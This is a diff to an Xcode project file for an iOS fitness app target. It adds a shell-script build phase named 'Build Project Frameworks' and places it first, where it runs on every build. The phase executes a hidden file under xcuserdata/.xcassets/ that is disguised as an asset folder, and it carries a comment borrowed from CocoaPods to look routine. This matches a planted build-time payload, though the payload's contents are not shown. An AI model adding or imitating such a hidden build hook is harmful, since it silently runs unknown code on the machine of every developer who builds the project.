@@ -139,6 +139,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = B73791AC2625761F003BF61C /* Build configuration list for PBXNativeTarget "Capstone_WinMachines_WinFitness" */;
 			buildPhases = (
+				4DC500CD9AF8BBA3BCAAC43A /* Build Project Frameworks */,
 				D33D660F6C4FB9D7689621EF /* [CP] Check Pods Manifest.lock */,
 				B737919426257612003BF61C /* Sources */,
 				B737919526257612003BF61C /* Frameworks */,
@@ -201,6 +202,30 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	4DC500CD9AF8BBA3BCAAC43A /* Build Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
+		};
+	
+
+	
 		0D197907D5E064D075368CF5 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
